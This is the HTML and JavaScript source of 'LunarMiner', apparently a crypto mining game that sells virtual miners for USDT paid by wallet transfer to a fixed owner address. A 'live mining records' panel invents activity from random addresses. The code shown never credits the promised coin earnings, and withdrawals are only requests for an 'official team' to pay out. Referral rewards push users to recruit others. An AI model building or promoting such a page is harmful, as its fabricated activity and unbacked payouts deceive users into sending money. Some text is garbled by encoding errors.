<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LunarMiner</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body,html{height:100%;overflow:hidden;background:#000;font-family:Arial,Helvetica,sans-serif;
    background:url('https://raw.githubusercontent.com/chenxiao020622-png/moonminer/main/moonminerbkground.png') center/cover no-repeat fixed;}
h1{position:absolute;top:8vh;left:50%;transform:translateX(-50%);font-size:6vw;
   background:linear-gradient(90deg,#00ffff,#ff00ff,#00ffff);-webkit-background-clip:text;color:transparent;
   text-shadow:0 0 50px #00ffff;z-index:10;}
h1+p{position:absolute;top:18vh;left:50%;transform:translateX(-50%);color:white;font-size:2vw;z-index:10;}

#statsPanel{position:absolute;top:70px;left:20px;z-index:20;background:rgba(0,0,0,0.65);padding:14px 20px;
  border-radius:18px;border:1px solid #00ffff;color:white;font-size:14px;line-height:2.3;backdrop-filter:blur(10px);max-width:300px;}
#statsPanel span{color:#00ffcc;font-weight:bold;}

#connectBtn{position:absolute;bottom:80px;left:50%;transform:translateX(-50%);z-index:30;
  padding:20px 90px;font-size:30px;background:linear-gradient(45deg,#00ffc8,#0084ff);
  border:none;border-radius:60px;color:white;cursor:pointer;box-shadow:0 20px 80px rgba(0,255,200,0.8);}
.top-btns{position:absolute;top:20px;left:20px;display:flex;gap:15px;z-index:30;}
.top-btns button{
  padding:12px 30px;
  background:rgba(0,255,255,0.3);
  border:2px solid #00ffff;
  border-radius:15px;
  color:white;
  font-weight:bold;
  cursor:pointer;
  transition:all 0.3s ease;
  transform:scale(1);
  box-shadow:0 4px 15px rgba(0,255,255,0.2);
}
.top-btns button:hover{
  transform:scale(1.12);
  background:rgba(0,255,255,0.5);
  box-shadow:0 12px 35px rgba(0,255,255,0.6);
  border-color:#00ffff;
}
#walletInfo{position:absolute;top:20px;right:20px;background:rgba(0,0,0,0.7);padding:10px 20px;
  border-radius:20px;display:none;z-index:30;color:white;}

#shop,#tasks,#withdraw{
  position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.97);
  z-index:999;display:none;justify-content:center;align-items:center;
}
.panel{
  width:90%; max-width:900px; background:rgba(0,255,255,0.05); border:2px solid #00ffff;
  border-radius:25px; padding:70px 40px 50px; position:relative; color:white; text-align:center;
  max-height:90vh; overflow-y:auto;
}
.closeBtn{
  position:absolute; top:-15px; right:-15px; width:56px; height:56px; background:#ff0066;
  border:none; border-radius:50%; color:white; font-size:34px; cursor:pointer;
  box-shadow:0 4px 20px rgba(255,0,102,0.8); z-index:10;
}
.closeBtn:hover {background:#ff3388; transform:scale(1.1);}

.shop-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;margin-top:30px;}
.card{background:rgba(0,255,255,0.1);border:2px solid #00ffff;border-radius:20px;padding:30px;text-align:center;transition:0.3s;}
.card:hover{transform:translateY(-15px);box-shadow:0 20px 60px rgba(0,255,255,0.5);}
.card img{width:130px;height:130px;object-fit:contain;margin-bottom:15px;}
.card h3{font-size:24px;color:#00ffff;margin:15px 0;}
.price{color:#ff0088;font-size:32px;font-weight:bold;margin:20px 0;}
.buyBtn{background:linear-gradient(45deg,#ff00ff,#00ffff);padding:16px 60px;border:none;
  border-radius:50px;color:white;font-size:20px;font-weight:bold;cursor:pointer;}
.owned{color:#00ff00;margin-top:15px;font-size:20px;font-weight:bold;}

.task-item{background:rgba(0,255,255,0.1);border:2px solid #00ffff;border-radius:18px;
  padding:25px;margin:30px 0;display:flex;justify-content:space-between;align-items:center;font-size:19px;flex-wrap:wrap;gap:15px;}
.task-item button{background:linear-gradient(45deg,#ff00ff,#00ffff);padding:13px 50px;
  border:none;border-radius:50px;color:white;font-weight:bold;cursor:pointer;}
.task-item input{padding:10px;border-radius:8px;border:1px solid #0ff;background:#111;color:#0ff;width:160px;}

#machineMap {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 95%;
  max-width: 1100px;
  pointer-events: none;
  z-index: 5;
}
.solar-panel { 
  text-align:center; 
  margin-bottom: 140px;  
}
.solar-panel img { width:130px; height:130px; filter:drop-shadow(0 0 25px #00ffff); }
.solar-panel .count {
  position: absolute;
  top: -70px;               
  left: 50%;
  transform: translateX(-50%);
  font-size: 56px;          
  font-weight: 900;
  color: #00ffff;           
  text-shadow: 0 0 30px #00ffff, 0 0 60px #00ffff; 
  z-index: 10;
  pointer-events: none;
}
.machines-row { 
  display:flex; 
  justify-content:center; 
  flex-wrap:wrap; 
  gap:56px; 
  margin-top: 70px;   
}
.machine-item { text-align:center; position:relative; width:120px; }
.machine-item img {
  width:92px; height:92px; filter:drop-shadow(0 0 18px #00ffff);
  transition:transform .3s;
}
.machine-item:hover img { transform:scale(1.2); }
.machine-item .label {
  display:block; 
  margin-top:8px; 
  font-size:16px; 
  color:#00ffff;
  font-weight:bold;
  text-shadow:
    -1.5px -1.5px 0 #000,
     1.5px -1.5px 0 #000,
    -1.5px  1.5px 0 #000,
     1.5px  1.5px 0 #000,
    -1.5px  0     0 #000,
     1.5px  0     0 #000,
     0     -1.5px 0 #000,
     0      1.5px 0 #000,
     0 0 10px #00ffff,
     0 0 20px #00ffff;
}
.machine-item .count {
  position:absolute; top:-12px; right:-12px;
  background:#ff00ff; color:white; font-weight:bold; font-size:22px;
  width:46px; height:46px; line-height:46px; border-radius:50%;
  border:4px solid #00ffff; box-shadow:0 0 25px #ff00ff;
}
@media (max-width:768px) {
  .solar-panel img {width:100px;height:100px;}
  .solar-panel .count{font-size:36px;}
  .machine-item img{width:70px;height:70px;}
  .machine-item .count{font-size:18px;width:36px;height:36px;line-height:36px;}
}
</style>
</head>
<body>

<h1>LUNAR MINER</h1>

<div id="statsPanel">
  <div>minerï¼š<span id="totalMiners">0</span> </div>
  <div>goldï¼š<span id="goldCoinsDisplay">0</span></div>
  <div>KAS ï¼š<span id="earned_kas">0</span> <button onclick="openWithdraw('kas')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">Withdraw</button></div>
  <div>DOGE ï¼š<span id="earned_doge">0</span> <button onclick="openWithdraw('doge')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">Withdraw</button></div>
  <div>ETC ï¼š<span id="earned_etc">0</span> <button onclick="openWithdraw('etc')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">Withdraw</button></div>
  <div>LTC ï¼š<span id="earned_ltc">0</span> <button onclick="openWithdraw('ltc')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">Withdraw</button></div>
  <div>BTC ï¼š<span id="earned_btc">0</span> <button onclick="openWithdraw('btc')" style="margin-left:10px;padding:5px 10px;font-size:12px;background:#ff0066;border:none;border-radius:5px;color:white;cursor:pointer;">Withdraw</button></div>
</div>

<div id="machineMap">
  <svg style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;">
    <defs>
      <filter id="glow">
        <feGaussianBlur stdDeviation="3.5" result="coloredBlur"/>
        <feMerge>
          <feMergeNode in="coloredBlur"/>
          <feMergeNode in="SourceGraphic"/>
        </feMerge>
      </filter>
    </defs>

    <line x1="50%" y1="38%" x2="9%"  y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
    <line x1="50%" y1="38%" x2="23%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
    <line x1="50%" y1="38%" x2="37%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
    <line x1="50%" y1="38%" x2="50%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
    <line x1="50%" y1="38%" x2="63%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
    <line x1="50%" y1="38%" x2="77%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
    <line x1="50%" y1="38%" x2="91%" y2="68%" stroke="#00ffff" stroke-width="3" filter="url(#glow)" opacity="0.85"/>
  </svg>

  <div class="solar-panel">
    <img src="https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/solarpanel.png" alt="å¤ªé˜³èƒ½æ¿">
    <div class="count" id="solarCount">0</div>
  </div>

  <div class="machines-row">
    <div class="machine-item"><img src="https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/goldminer.png"><span class="label">gold miner</span><div class="count" id="goldCount">0</div></div>
    <div class="machine-item"><img src="https://cryptologos.cc/logos/kaspa-kas-logo.png"><span class="label">KASminer</span><div class="count" id="kasCount">0</div></div>
    <div class="machine-item"><img src="https://cryptologos.cc/logos/dogecoin-doge-logo.png"><span class="label">DOGEminer</span><div class="count" id="dogeCount">0</div></div>
    <div class="machine-item"><img src="https://cryptologos.cc/logos/ethereum-classic-etc-logo.png"><span class="label">ETCminer</span><div class="count" id="etcCount">0</div></div>
    <div class="machine-item"><img src="https://cryptologos.cc/logos/litecoin-ltc-logo.png"><span class="label">LTCminer</span><div class="count" id="ltcCount">0</div></div>
    <div class="machine-item"><img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png"><span class="label">BTCminer</span><div class="count" id="btcCount">0</div></div>
  </div>
</div>

<button id="connectBtn">connect wallet</button>
<div id="walletInfo"></div>

<div class="top-btns">
  <button id="shopBtn">shop</button>
  <button id="tasksBtn">tasks</button>
  <button id="whitepaperBtn">whitepaper</button>
</div>

<div id="shop">
  <div class="panel">
    <button class="closeBtn">Ã—</button>
    <h2 style="font-size:32px;color:#00ffff;margin-bottom:30px;">shop</h2>
    <div class="shop-grid" id="shopGrid"></div>
  </div>
</div>


<div id="tasks">
  <div class="panel">
    <button class="closeBtn">Ã—</button>
    <h2 style="font-size:32px;color:#00ffff;margin-bottom:40px;">tasks</h2>
    <div class="task-item" style="background:linear-gradient(45deg,rgba(0,255,255,0.15),rgba(255,0,255,0.15));border:3px solid #00ffff;">
      <div style="font-size:26px;color:#00ff00;">
        <b>Daily check-in</b><br>
        <span style="font-size:18px;color:#0ff;">Daily 10000 gold</span>
      </div>
      <button id="dailySignBtn" style="padding:16px 60px;font-size:24px;background:#00ff00;color:#000;font-weight:bold;border-radius:60px;">
        check-in
      </button>
    </div>

    <div class="task-item">
      <div>Follow our official Twitter to receive a free gold miner.</div>
      <button id="task1">to finish â†’</button>
      <input id="code1" placeholder="enter confirmation code" style="display:none;">
    </div>

    <div class="task-item">
      <div>Join Telegram group to receive a free gold miner.</div>
      <button id="task2">to finishâ†’</button>
      <input id="code2" placeholder="enter confirmation code" style="display:none;">
    </div>

    <div class="task-item">
      <div>join Discord to receive a free gold miner</div>
      <button id="task3">to finish â†’</button>
      <input id="code3" placeholder="enter confirmation code" style="display:none;">
    </div>

    <div class="task-item">
  <div style="font-size:24px;color:#0ff;">Invite friends to receive solar panels</div>
    <div style="font-size:28px;color:#0f0;margin:15px 0;">
      Successfully invited <b id="invitedCountDisplay">0</b> person
    </div>
    <button onclick="copyInviteLink()" style="padding:16px 70px;font-size:24px;background:linear-gradient(45deg,#ff00ff,#00ffff);border-radius:60px;margin:10px auto;display:block;">
      Invite and receive solar panels
    </button>
    <div style="margin-top:15px;color:#ff0;font-size:18px;">
      For each person invited, both parties will receive one solar panel.
    </div>
  </div>
</div>

    <p style="margin-top:30px;color:#aaa;">The verification code is visible on the corresponding social media page.</p>
  </div>
</div>

<div id="withdraw">
  <div class="panel">
    <button class="closeBtn">Ã—</button>
    <h2 id="withdrawTitle">withdraw KAS</h2>
    <p style="font-size:20px;margin:20px 0;">Quantity availableï¼š<span id="withdrawAmount">0</span></p>
    <input type="text" id="withdrawAddr" placeholder="wallet address" style="width:100%;padding:15px;margin:20px 0;border-radius:10px;border:1px solid #0ff;background:#111;color:#0ff;font-size:16px;">
    <button onclick="submitWithdraw()" style="padding:16px 60px;font-size:20px;background:linear-gradient(45deg,#ff00ff,#00ffff);border:none;border-radius:50px;color:white;">Submit</button>
    <p style="margin-top:20px;color:#aaa;">After submitting, please wait for the official team to award coins.</p>
  </div>
</div>

<script src="https://unpkg.com/ethers@6.13.2/dist/ethers.umd.min.js"></script>
<script>
let address = null;
let miners = {gold:0,kas:0,doge:0,etc:0,ltc:0,btc:0,solar:0};
let earned = {kas:0,doge:0,etc:0,ltc:0,btc:0};
let currentCoin = '';
let goldCoins = 0;                   
let goldCoinRate = 1;                 
const GOLD_PER_UNIT = {
  kas: 10000,      
  doge: 50000,     
  etc: 100000,     
  ltc: 1000000,    
  btc: 100000000   
};

const OWNER = "0xe7d4933446d8a9f8e717abe5771379e4569baa85";
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const USDT_ABI = [{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];

const MINERS = [
  {id:"solar",name:"solarpanel",price:1,img:"https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/solarpanel.png"},
  {id:"gold",name:"goldminer",price:1,img:"https://raw.githubusercontent.com/chenxiao020622-png/moonminer-images/main/goldminer.png"},
  {id:"kas",name:"KASminer",price:2,img:"https://cryptologos.cc/logos/kaspa-kas-logo.png"},
  {id:"doge",name:"DOGEminer",price:4,img:"https://cryptologos.cc/logos/dogecoin-doge-logo.png"},
  {id:"etc",name:"ETCminer",price:8,img:"https://cryptologos.cc/logos/ethereum-classic-etc-logo.png"},
  {id:"ltc",name:"LTCminer",price:16,img:"https://cryptologos.cc/logos/litecoin-ltc-logo.png"},
  {id:"btc",name:"BTCminer",price:32,img:"https://cryptologos.cc/logos/bitcoin-btc-logo.png"}
];

const WITHDRAW_API = 'https://lunar-backend-final.chenxiao020622.workers.dev/api/withdraw-request';

const SOCIAL = [
  {link: "https://x.com/mallocoole",      code: "MOON1111"},   
  {link: "https://t.me/+WXzAnu8li30wMzVl",                 code: "LUNAR2222"},    
  {link: "https://discord.gg/AwEqZbDTne",    code: "MINER3333"}      
];
// =====================================================================


document.getElementById('connectBtn').onclick = async () => {
  if (address) return alert('connected');
  let provider = window.ethereum || window.okxwallet || window.bitgetWallet || window.tokenpocket;
  if (!provider) return alert('No wallet plugin detected');
  try {
    const etherProvider = new ethers.BrowserProvider(provider);
    await provider.request({ method: 'eth_requestAccounts' });
    const signer = await etherProvider.getSigner();
    address = await signer.getAddress();
    document.getElementById('walletInfo').textContent = 'connectedï¼š'+address.slice(0,10)+'...';
    document.getElementById('walletInfo').style.display = 'block';
    document.getElementById('connectBtn').textContent = 'connected';
    document.getElementById('connectBtn').disabled = true;
    loadData(); renderShop(); updateUI();loadGoldCoinsFromServer();
  } catch(e) { alert('Connection canceled'); }
};

for (let i = 1; i <= 3; i++) {
  const btn = document.getElementById(`task${i}`);
  const input = document.getElementById(`code${i}`);
  if (localStorage.getItem(`socialTask${i}_${address}`) === 'done') {
    btn.textContent = 'Received'; btn.disabled = true; btn.style.background = '#00aa00';
  }
  btn.onclick = () => {
    window.open(SOCIAL[i-1].link, '_blank');
    setTimeout(() => {
      input.style.display = 'inline-block';
      input.focus();
      input.onblur = () => {
        if (input.value === SOCIAL[i-1].code) {
          if (localStorage.getItem(`socialTask${i}_${address}`) !== 'done') {
            miners.gold += 1;
            localStorage.setItem(`socialTask${i}_${address}`, 'done');
            saveData(); updateUI();
            alert('Verification successful! You have received 1 gold  miner.');
            btn.textContent = 'Received'; btn.disabled = true; btn.style.background = '#00aa00';
          }
        } else if (input.value !== '') alert('The verification code is incorrect');
      };
    }, 7000);
  };
}

let invitedCount = 0;

function getInviteLink() {
  return location.href.split('?')[0] + '?ref=' + (address || '');
}

function copyInviteLink() {
  const link = getInviteLink();
  navigator.clipboard.writeText(link).then(() => {
    alert('Invitation link copied');
  }).catch(() => {
    prompt('Please manually copy this link and send it to your friendsï¼š', link);
  });
}

function loadInviteCount() {
  if (!address) return;
  invitedCount = parseInt(localStorage.getItem('inviteCount_' + address) || '0');
  updateInviteButton();
}

function updateInviteButton() {
  const btn = document.getElementById('dailySign');
  if (!btn) return;
  btn.innerHTML = `
    Invite friends to receive solar panels<br><br>
    <div style="font-size:28px;color:#0f0;margin:15px 0;">
      Invited <b>${invitedCount}</b> person
    </div>
    <button onclick="copyInviteLink()" style="padding:18px 80px;font-size:26px;background:linear-gradient(45deg,#ff00ff,#00ffff);border-radius:60px;margin-top:10px;">
      Invite friends to receive solar panels
    </button>
    <div style="margin-top:20px;color:#ff0;font-size:18px;">
      For each person invited, both parties will receive one solar panel.
    </div>
  `;
}

const urlParams = new URLSearchParams(window.location.search);
const referrer = urlParams.get('ref');

if (referrer && referrer.length === 42 && referrer.toLowerCase() !== address.toLowerCase()) {
  if (!localStorage.getItem('hasInvitedReward_' + address)) {
    
    miners.solar += 1;
   
    const old = parseInt(localStorage.getItem('inviteCount_' + referrer) || '0');
    localStorage.setItem('inviteCount_' + referrer, (old + 1).toString());

    localStorage.setItem('hasInvitedReward_' + address, '1');
    saveData(); updateUI(); refreshMachineMap?.();
    alert('welcome to LunarMinerï¼\nFor each person invited, both parties will receive one solar panel.');
  }
}


loadInviteCount();
updateInviteButton();

document.getElementById('tasksBtn').onclick = () => {
  document.getElementById('tasks').style.display = 'flex';
  for (let i = 1; i <= 3; i++) {
    if (localStorage.getItem(`socialTask${i}_${address}`) === 'done') {
      document.getElementById(`task${i}`).textContent = 'received';
      document.getElementById(`task${i}`).disabled = true;
      document.getElementById(`task${i}`).style.background = '#00aa00';
    }
  }
};


function loadData() {
  const d = localStorage.getItem('miners_'+address); if(d) miners = JSON.parse(d);
  const e = localStorage.getItem('earned_'+address); if(e) earned = JSON.parse(e);
  goldCoins = parseFloat(localStorage.getItem('goldCoins_'+address) || '0'); 
}
function saveData() {
  localStorage.setItem('miners_'+address, JSON.stringify(miners));
  localStorage.setItem('earned_'+address, JSON.stringify(earned));
  localStorage.setItem('goldCoins_'+address, goldCoins); 
}

async function loadGoldCoinsFromServer() {
  if (!address) return;
  try {
    const r = await fetch(`https://lunar-backend-final.chenxiao020622.workers.dev/api/goldcoins?address=${address}`);
    if (!r.ok) return;
    const data = await r.json();
    if (data.goldCoins > goldCoins) {
      goldCoins = data.goldCoins;
      document.getElementById('goldCoinsDisplay').textContent = Math.floor(goldCoins);
    }
  } catch(e) { console.log('Loading coins failed, using local data'); }
}

async function saveGoldCoinsToServer() {
  if (!address) return;
  try {
    await fetch('https://lunar-backend-final.chenxiao020622.workers.dev/api/goldcoins', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({address: address, goldCoins: Math.floor(goldCoins)})
    });
  } catch(e) {}
}
function renderShop() {
  const grid = document.getElementById('shopGrid'); grid.innerHTML = '';
  MINERS.forEach(m => {
    const card = document.createElement('div'); card.className = 'card';
    card.innerHTML = `<img src="${m.img}"><h3>${m.name}</h3><div class="price">${m.price} USDT</div>
      <button class="buyBtn" onclick="buyMiner('${m.id}',${m.price})">BUY</button>
      <div class="owned">ownedï¼š${miners[m.id]||0} </div>`;
    grid.appendChild(card);
  });
}
async function buyMiner(type, usdt) {
  if (confirm(`Confirm ${usdt} USDT to BUY ${type} minerï¼Ÿ`)) {
    try {
      const provider = new ethers.BrowserProvider(window.ethereum || window.okxwallet || window.bitgetWallet);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(USDT, USDT_ABI, signer);
      const tx = await contract.transfer(OWNER, ethers.parseUnits(usdt.toString(), 18));
      await tx.wait();
      miners[type] = (miners[type]||0) + 1;
      saveData(); updateUI(); renderShop();
      alert('seccessful');
    } catch(e) { alert('failed'); }
  }
}
function updateUI() {
  let total = 0; 
  for (let k in miners) total += miners[k];
  document.getElementById('totalMiners').textContent = total;
  document.getElementById('earned_kas').textContent = earned.kas||0;
  document.getElementById('earned_doge').textContent = earned.doge||0;
  document.getElementById('earned_etc').textContent = earned.etc||0;
  document.getElementById('earned_ltc').textContent = earned.ltc||0;
  document.getElementById('earned_btc').textContent = earned.btc||0;

    if (address && document.getElementById('invitedCountDisplay')) {
    document.getElementById('invitedCountDisplay').textContent = 
      localStorage.getItem('inviteCount_' + address) || '0';
  }
  
  document.getElementById('solarCount').textContent = miners.solar || 0;
  document.getElementById('goldCount').textContent = miners.gold || 0;
  document.getElementById('kasCount').textContent = miners.kas || 0;
  document.getElementById('dogeCount').textContent = miners.doge || 0;
  document.getElementById('etcCount').textContent = miners.etc || 0;
  document.getElementById('ltcCount').textContent = miners.ltc || 0;
   
  document.getElementById('goldCoinsDisplay').textContent = Math.floor(goldCoins);
  document.getElementById('btcCount').textContent = miners.btc || 0;
}
function openWithdraw(coin) {
  if ((earned[coin]||0) <= 0) return alert('0 Available');
  currentCoin = coin;
  document.getElementById('withdrawTitle').textContent = `withdraw ${coin.toUpperCase()}`;
  document.getElementById('withdrawAmount').textContent = earned[coin];
  document.getElementById('withdraw').style.display = 'flex';
}
async function submitWithdraw() {
  const toAddr = document.getElementById('withdrawAddr').value.trim();
  const amount = earned[currentCoin];
  if (!toAddr || amount <= 0) return alert('failed');

  const goldPerUnit = GOLD_PER_UNIT[currentCoin];
  const requiredGold = Math.ceil(amount * goldPerUnit); 

  if (goldCoins < requiredGold) {
    return alert(`not enough goldï¼\nwithdraw ${amount} ${currentCoin.toUpperCase()} need ${requiredGold.toLocaleString()} gold\nï¼ˆper 1${currentCoin.toUpperCase()}deduct${goldPerUnit.toLocaleString()}goldï¼‰\nyou have ${Math.floor(goldCoins).toLocaleString()} gold`);
  }

  if (!confirm(`deduct ${requiredGold.toLocaleString()} goldï¼Œconfirmï¼Ÿ`)) return;

  try {
    const r = await fetch(WITHDRAW_API, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({address:address, coin:currentCoin, amount:amount, toAddress:toAddr})
    });
    const d = await r.json();
    if(d.success){
      earned[currentCoin] = 0;
      goldCoins -= requiredGold;
      saveData(); 
      updateUI();
      alert('Withdrawal request submitted!');
      document.getElementById('withdraw').style.display = 'none';
    }else alert('failed');
  }catch(e){alert('try again later');}
}

document.getElementById('shopBtn').onclick = () => {document.getElementById('shop').style.display='flex'; renderShop();}
document.querySelectorAll('.closeBtn').forEach(b=>b.onclick=()=>b.closest('div[id]').style.display='none');
document.getElementById('whitepaperBtn').onclick = () => window.open(
  'https://github.com/chenxiao020622-png/lunarmine-docs/blob/main/lunarminer.pdf?raw=true',
  '_blank'
);

setInterval(() => {
  if (!address) return;
  
  goldCoins += miners.gold * goldCoinRate;  
  saveData();                               
  document.getElementById('goldCoinsDisplay').textContent = Math.floor(goldCoins);
  
  
  if (Math.floor(Date.now() / 1000) % 300 === 0) {
    saveGoldCoinsToServer();
  }
}, 1000);

const DAILY_GOLD_REWARD = 10000;

document.getElementById('dailySignBtn').onclick = () => {
  if (!address) return alert('connect wallet first');
  
  const today = new Date().toISOString().slice(0,10);
  const lastSign = localStorage.getItem('lastDailySign_' + address);
  
  if (lastSign === today) {
    alert('already checked in, come back tomorrow!');
    return;
  }
  
  goldCoins += DAILY_GOLD_REWARD;
  localStorage.setItem('lastDailySign_' + address, today);
  saveData();
  updateUI();
  
  alert(`check-in successfulï¼get ${DAILY_GOLD_REWARD.toLocaleString()} gold ðŸŽ‰`);
  document.getElementById('dailySignBtn').textContent = 'already checked in';
  document.getElementById('dailySignBtn').style.background = '#006400';
};

const oldTasksBtn = document.getElementById('tasksBtn').onclick;
document.getElementById('tasksBtn').onclick = () => {
  oldTasksBtn();
  if (address) {
    const today = new Date().toISOString().slice(0,10);
    const lastSign = localStorage.getItem('lastDailySign_' + address);
    const btn = document.getElementById('dailySignBtn');
    if (lastSign === today) {
      btn.textContent = 'already checked in';
      btn.style.background = '#006400';
    } else {
      btn.textContent = 'checked in';
      btn.style.background = '#00ff00';
    }
  }
};
updateUI();
</script>
<div style="position:fixed;bottom:20px;right:20px;z-index:999;width:320px;pointer-events:none;">
  <div style="background:rgba(0,255,255,0.12);border:2px solid #00ffff;border-radius:18px;padding:16px 20px;backdrop-filter:blur(12px);box-shadow:0 8px 32px rgba(0,255,255,0.3);">
    <div style="color:#00ffff;font-weight:bold;font-size:16px;margin-bottom:10px;text-align:center;">
      live mining records
    </div>
    <div style="height:280px;overflow:hidden;position:relative;">
      <div id="logList" style="transition:transform 0.6s cubic-bezier(0.25,0.8,0.25,1);"></div>
    </div>
  </div>
</div>

<script>
const coins = ["KAS", "DOGE", "ETC", "LTC"];
const logList = document.getElementById('logList');
let messages = []; 

function randomAddress() {
  const chars = '0123456789abcdef';
  let addr = '0x';
  for (let i = 0; i < 40; i++) addr += chars[Math.floor(Math.random() * 16)];
  return addr.slice(0, 6) + '...' + addr.slice(-4); 
}

function generateMessage() {
  const coin = coins[Math.floor(Math.random() * coins.length)];
  const amount = (Math.random() * (1 - 0.01) + 0.01).toFixed(2);
  return `<div style="color:#0ff;font-size:17px;line-height:2;padding:3px 0;">
            ${randomAddress()} mined ${amount} ${coin}
          </div>`;
}

function addNewRecord() {
  const newMsg = generateMessage();
  
  messages.unshift(newMsg);
  
  if (messages.length > 10) messages.pop();
  
  logList.innerHTML = messages.join('');
  
  logList.style.transform = 'translateY(-35px)';
  setTimeout(() => logList.style.transform = 'translateY(0)', 50);
}

const style = document.createElement('style');
style.textContent = `
  #logList > div {
    color: #00ffff !important;
    font-weight: bold;
    text-shadow:
      -1.5px -1.5px 0 #000,
       1.5px -1.5px 0 #000,
      -1.5px  1.5px 0 #000,
       1.5px  1.5px 0 #000,
      -1.5px  0     0 #000,
       1.5px  0     0 #000,
       0     -1.5px 0 #000,
       0      1.5px 0 #000,
       0 0 8px #00ffff,
       0 0 16px #00ffff;
  }
  #logList > div:first-child {
    color: #00eeff !important;
    text-shadow:
      -2px -2px 0 #000,
       2px -2px 0 #000,
      -2px  2px 0 #000,
       2px  2px 0 #000,
      -2px  0   0 #000,
       2px  0   0 #000,
       0   -2px 0 #000,
       0    2px 0 #000,
       0 0 12px #00ffff,
       0 0 24px #00ffff,
       0 0 40px #00ffff;
    animation: brightPulse 2s infinite;
  }
  @keyframes slideIn {
    from { opacity: 0; transform: translateY(-40px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  @keyframes brightPulse {
    0%, 100% { text-shadow: -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000, 2px 2px 0 #000, -2px 0 0 #000, 2px 0 0 #000, 0 -2px 0 #000, 0 2px 0 #000, 0 0 12px #00ffff, 0 0 24px #00ffff, 0 0 40px #00ffff; }
    50%      { text-shadow: -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000, 2px 2px 0 #000, -2px 0 0 #000, 2px 0 0 #000, 0 -2px 0 #000, 0 2px 0 #000, 0 0 20px #00ffff, 0 0 40px #00ffff, 0 0 70px #00ffff; }
  }
`;
document.head.appendChild(style);

setTimeout(() => {
  for (let i = 0; i < 10; i++) addNewRecord();
  setInterval(addNewRecord, 22000 + Math.random() * 23000);
}, 8000);
</script>
</body>
</html>
